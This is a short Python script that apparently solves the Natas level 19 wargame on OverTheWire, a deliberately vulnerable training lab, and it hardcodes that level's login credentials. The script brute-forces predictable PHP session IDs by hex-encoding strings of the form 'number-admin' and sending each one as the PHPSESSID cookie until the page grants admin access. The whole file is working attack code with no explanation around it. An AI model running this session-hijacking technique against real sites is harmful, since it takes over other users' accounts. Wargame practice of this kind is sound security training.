import requests

username = 'natas19'
password = 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr'
url = "http://natas19.natas.labs.overthewire.org/index.php"

for x in range(1, 641):
    session_id = f"{x}-admin".encode().hex()
    print(f"Attempting: {x}-admin", end="\r")
    response = requests.get(url, auth=(username, password),
                            cookies={"PHPSESSID": session_id})
    if "You are an admin" in response.text:
        print(f"\nFound: {x}-admin = {session_id}")
        print(response.text)
        break